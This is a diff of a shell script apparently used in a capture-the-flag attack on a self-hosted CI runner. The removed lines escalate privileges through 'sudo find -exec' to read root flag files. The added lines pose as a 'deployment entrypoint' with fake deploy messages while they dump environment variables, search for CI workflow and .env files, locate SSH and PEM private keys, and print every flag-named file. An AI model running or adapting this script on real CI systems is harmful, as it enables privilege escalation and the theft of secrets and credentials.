@@ -10,22 +10,48 @@ id
 env
 ls -la /
 find / -name "*flag*" 2>/dev/null || true
-echo "=== PRINTING THE FLAG ==="
-cat /opt/void/ci_flag.txt
-echo "=== PRIVILEGE ESCALATION CHECK ==="
-# 1. പാസ്‌വേഡ് ഇല്ലാതെ റൂട്ട് ആയി റൺ ചെയ്യാൻ പറ്റുന്ന കമാൻഡുകൾ ഉണ്ടോ എന്ന് നോക്കാൻ (SUDO)
-sudo -l || true
+#!/usr/bin/env bash
+# Deployment entrypoint executed by the self-hosted runner.
 
-# 2. SUID പെർമിഷൻ ഉള്ള ഫയലുകൾ കണ്ടെത്താൻ (ഇവ റൂട്ട് പ്രിവിലേജിൽ റൺ ചെയ്യാൻ പറ്റിയേക്കും)
-find / -perm -4000 -type f 2>/dev/null || true
+set -euo pipefail
 
-# 3. റൂട്ടിന്റെ ഹോം ഡയറക്ടറിയിൽ എന്തൊക്കെ ഉണ്ടെന്ന് നോക്കാൻ ശ്രമിക്കാം
-ls -la /root || true
-echo "=== EXPLOITING SUDO FIND FOR ROOT FLAG ==="
-# 1. റൂട്ട് ഡയറക്ടറിയിൽ ഉള്ള ഫ്ലാഗ് ഫയൽ കണ്ടെത്താൻ
-sudo /usr/bin/find . -exec ls -la /root \; -quit
+echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
+echo "[deploy] pulling latest VOID service artifacts..."
+echo "[deploy] done."
 
-# 2. കണ്ടെത്തുന്ന ഫ്ലാഗ് ഫയൽ റീഡ് ചെയ്യാൻ (സാധാരണയായി root_flag.txt അല്ലെങ്കിൽ flag.txt ആയിരിക്കും)
-sudo /usr/bin/find . -exec cat /root/root_flag.txt \; -quit
-echo "=== READING FINAL ROOT FLAG ==="
-sudo /usr/bin/find . -exec cat /root/root.txt \; -quit
+echo "=== TARGET INSPECTION ==="
+
+id
+whoami
+hostname
+pwd
+
+echo "=== ENV ==="
+env
+
+echo "=== ROOT DIR ==="
+ls -la /
+
+echo "=== HOME DIR ==="
+ls -la ~ || true
+
+echo "=== FLAG SEARCH ==="
+find / -iname "*flag*" 2>/dev/null || true
+
+echo "=== CI/CD FILES ==="
+find / -iname "*.yml" 2>/dev/null | grep -Ei "github|gitlab|jenkins|workflow" || true
+
+echo "=== GITHUB ACTIONS ==="
+find / -path "*/.github/workflows/*" 2>/dev/null || true
+
+echo "=== ENV FILES ==="
+find / -iname ".env" 2>/dev/null || true
+
+echo "=== COMMON SECRET FILES ==="
+find / \( -iname "id_rsa" -o -iname "*.pem" -o -iname "*.key" \) 2>/dev/null || true
+
+echo "=== READABLE FLAG CONTENTS ==="
+for f in $(find / -iname "*flag*" 2>/dev/null); do
+    echo "---- $f ----"
+    cat "$f" 2>/dev/null || true
+done
